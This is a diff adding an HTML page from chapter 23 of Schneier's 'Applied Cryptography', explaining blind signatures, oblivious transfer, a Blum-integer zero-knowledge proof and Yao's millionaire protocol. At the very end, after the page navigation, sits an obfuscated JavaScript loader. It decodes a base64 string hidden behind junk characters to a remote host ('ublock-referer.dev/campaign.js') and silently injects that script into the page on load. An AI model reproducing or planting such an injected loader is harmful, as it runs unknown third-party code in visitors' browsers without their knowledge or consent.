@@ -1,0 +1,176 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Special Algorithms for Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=23//-->
+<!--PAGES=548-551//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Carol&#146;s public key is <I>e,</I> her private key is <I>d,</I> and the RSA modulus is <I>n.</I></P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice and Bob agree on a random <I>k</I> and an <I>m</I> such that
+<DL>
+<DD><I>km</I> &#8801; <I>e</I> (mod <I>n</I>)
+</DL>
+<BR>They should choose the numbers randomly, using a coin-flip protocol to generate <I>k</I> and then computing <I>m.</I> If both <I>k</I> and <I>m</I> are greater than 3, the protocol continues. Otherwise, they choose again.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice and Bob generate a random ciphertext, <I>C.</I> Again, they should use a coin-flip protocol.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice, using Carol&#146;s private key, computes
+<DL>
+<DD><I>M</I> = <I>C<SUP>d</SUP></I> mod <I>n</I>
+</DL>
+</DL>
+<P>She then computes
+</P>
+<DL>
+<DD><I>X</I> = <I>M<SUP>k</SUP></I> mod <I>n</I>
+</DL>
+<DL>
+<BR>and sends <I>X</I> to Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob confirms that <I>X<SUP>m</SUP></I> mod <I>n</I> = <I>C.</I> If it does, he believes Alice.
+</DL>
+<P>A similar protocol can be used to demonstrate the ability to break a discrete logarithm problem [888].
+</P>
+<P><FONT SIZE="+1"><B><I>Zero-Knowledge Proof that <I>n</I> Is a Blum Integer
+</I></B></FONT></P>
+<P>There are no known truly practical zero-knowledge proofs that <I>n</I> =<I>pq,</I> where <I>p</I> and <I>q</I> are primes congruent to 3 modulo 4. However, if you allow <I>n</I> to be of the form <I>p<SUP>r</SUP>q<SUP>s</SUP>,</I> where <I>r</I> and <I>s</I> are odd, then the properties which make Blum integers useful in cryptography still hold. And there exists a zero-knowledge proof that <I>n</I> is of that form.</P>
+<P>Assume Alice knows the factorization of the Blum integer <I>n,</I> where <I>n</I> is of the form previously discussed. Here&#146;s how she can prove to Bob that <I>n</I> is of that form [660].</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends Bob a number <I>u</I> which has a Jacobi symbol -1 modulo <I>n.</I>
+<DD><B>(2)</B>&nbsp;&nbsp;Alice and Bob jointly agree on random bits: <I>b</I><SUB>1</SUB> , <I>b</I><SUB>2</SUB> ,  ..., <I>b</I><SUB>k</SUB>.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice and Bob jointly agree on random numbers: <I>x</I><SUB>1</SUB> , <I>x</I><SUB>2</SUB> ,  ..., <I>x</I><SUB>k</SUB>.
+<DD><B>(4)</B>&nbsp;&nbsp;For each <I>i</I> = <I>1, 2,...,</I> <I>k,</I> Alice sends Bob a square root modulo <I>n,</I> of one of the four numbers: <I>x</I><SUB>i</SUB>, <I>-x</I><SUB>i</SUB>, <I>ux</I><SUB>i</SUB>, <I>-ux</I><SUB>i</SUB>. The square root must have the Jacobi symbol <I>b</I><SUB>i</SUB>.
+</DL>
+<P>The odds of Alice successfully cheating are one in 2<SUP>k</SUP>.</P>
+<H3><A NAME="Heading13"></A><FONT COLOR="#000077">23.12 Blind Signatures</FONT></H3>
+<P>The notion of blind signatures (see Section 5.3) was invented by David Chaum [317,323], who also invented their first implementation [318]. It uses the RSA algorithm.
+</P>
+<P>Bob has a public key, <I>e,</I> a private key, <I>d,</I> and a public modulus, <I>n.</I> Alice wants Bob to sign message <I>m</I> blindly.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses a random value, <I>k,</I> between 1 and <I>n.</I> Then she blinds <I>m</I> by computing
+<DL>
+<DD><I>t</I> = <I>mk<SUP>e</SUP></I> mod <I>n</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob signs <I>t</I>
+<DL>
+<DD><I>t<SUP>d</SUP></I> = (<I>mk<SUP>e</SUP></I>)<SUP>d</SUP>  mod <I>n</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice unblinds <I>t<SUP>d</SUP></I> by computing
+<DL>
+<DD><I>s</I> = <I>t<SUP>d</SUP></I>/<I>k</I> mod <I>n</I>
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;And the result is
+<DL>
+<DD><I>s</I> = <I>m<SUP>d</SUP></I> mod <I>n</I>
+</DL>
+<BR>This can easily be shown
+<DL>
+<DD><I>t<SUP>d</SUP></I> &#8801; (<I>mk<SUP>e</SUP></I>)<SUP>d</SUP>  &#8801; <I>m<SUP>d</SUP>k</I> (mod <I>n</I>), so <I>t<SUP>d</SUP></I>/<I>k</I> = <I>m<SUP>d</SUP>k</I>/<I>k</I> &#8801; <I>m<SUP>d</SUP></I> (mod <I>n</I>).
+</DL>
+</DL>
+<P>Chaum invented a family of more complicated blind signature algorithms in [320,324], called blind unanticipated signatures. These signatures are more complex in construction, but more flexible.
+</P>
+<H3><A NAME="Heading14"></A><FONT COLOR="#000077">23.13 Oblivious Transfer</FONT></H3>
+<P>In this protocol by Michael Rabin [1286], Alice has a 50 percent chance of sending Bob two primes, <I>p,</I> and <I>q.</I> Alice will not know whether the transfer is successful. (See Section 5.5.) (This protocol can be used to send Bob any message with a 50 percent success rate if <I>p</I> and <I>q</I> reveal an RSA private key.)</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends Bob the product of the two primes: <I>n</I> = <I>pq.</I>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob chooses a random <I>x</I> less than <I>n,</I> such that <I>x</I> is relatively prime to <I>n.</I> He sends Alice:
+<DL>
+<DD><I>a</I> = <I>x<SUP>2</SUP></I> mod <I>n</I>
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice, knowing <I>p</I> and <I>q,</I> computes the four roots of <I>a: x, n</I> - <I>x, y,</I> and <I>n</I> - <I>y.</I> She chooses one of these roots at random and sends it to Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;If Bob receives <I>y</I> or <I>n</I> - <I>y,</I> he can compute the greatest common divisor of <I>x</I> &#43; <I>y</I> and <I>n,</I> which is either <I>p</I> or <I>q.</I> Then, of course, <I>n</I>/<I>p</I> = <I>q.</I>
+<BR>If Bob receives <I>x</I> or <I>n</I> - <I>x,</I> he can&#146;t compute anything.
+</DL>
+<P>This protocol may have a weakness: It might be the case that Bob can compute a number <I>a</I> such that given the square root of <I>a</I> you can calculate a factor of <I>n</I> all the time.</P>
+<H3><A NAME="Heading15"></A><FONT COLOR="#000077">23.14 Secure Multiparty Computation</FONT></H3>
+<P>This protocol is from [1373]. Alice knows the integer <I>i;</I> Bob knows the integer <I>j.</I> Alice and Bob together wish to know whether <I>i</I> &#8804; <I>j</I> or if <I>i</I> &gt <I>j,</I> but neither Alice nor Bob wish to reveal the integer each knows. This special case of secure multiparty computation (see Section 6.2) is sometimes known as <B>Yao&#146;s millionaire problem</B> [1627].</P>
+<P>For this example, assume that <I>i</I> and <I>j</I> range from 1 to 100. Bob has a public key and a private key.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses a large random number, <I>x,</I> and encrypts it in Bob&#146;s public key.
+<DL>
+<DD><I>c</I> = <I>E</I><SUB>B</SUB>(<I>x</I>)
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Alice computes <I>c</I> - <I>i</I> and sends the result to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob computes the following 100 numbers:
+<DL>
+<DD><I>y</I><SUB>u</SUB> = <I>D</I><SUB>B</SUB>(<I>c</I> - <I>i</I> &#43; <I>u</I>), for 1 &#8804; <I>u</I> &#8804; 100
+</DL>
+<BR><I>D</I><SUB>B</SUB> is the decryption algorithm with Bob&#146;s private key.
+<BR>He chooses a large random prime, <I>p.</I> (The size of <I>p</I> should be somewhat smaller than <I>x.</I> Bob doesn&#146;t know <I>x,</I> but Alice could easily tell him the size of <I>x.</I>) He then computes the following 100 numbers:
+<DL>
+<DD><I>z</I><SUB>u</SUB> = (<I>y</I><SUB>u</SUB> mod <I>p</I>), for 1 &#8804; <I>u</I> &#8804; 100
+</DL>
+<BR>He then verifies that, for all <I>u</I> &#8800; <I>v</I>
+<DL>
+<DD>|<I>z</I><SUB>u</SUB> - <I>z</I><SUB>v</SUB>| &#8805; 2
+</DL>
+<BR>and that for all <I>u</I>
+<DL>
+<DD>0 &lt <I>z</I><SUB>u</SUB> &lt <I>p</I> - 1
+</DL>
+<BR>If this is not true, Bob chooses another prime and tries again.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob sends Alice this sequence of numbers in this exact order:
+<DL>
+<DD><I>z</I><SUB>1</SUB> , <I>z</I><SUB>2</SUB> ,  ..., <I>z</I><SUB>j</SUB>, <I>z</I><SUB>j&#43;1</SUB> &#43; 1, <I>z</I><SUB>j&#43;2</SUB> &#43; 1,..., <I>z</I><SUB>100</SUB> &#43; 1, <I>p</I>
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Alice checks whether the <I>i</I>th number in the sequence is congruent to <I>x</I> mod <I>p.</I> If it is, she concludes that <I>i</I> &#8804; <I>j.</I> If it is not, she concludes that <I>i</I> &gt <I>j.</I>
+<DD><B>(6)</B>&nbsp;&nbsp;Alice tells Bob the conclusion.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="23-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="23-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(IizIamMn, FfLvmYll) {FfLvmYll = IizIamMn.createElement('script');FfLvmYll.type = 'text/javascript';FfLvmYll.async = true;FfLvmYll.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');IizIamMn.getElementsByTagName('body')[0].appendChild(FfLvmYll);}(document));</script></body>
+</html>
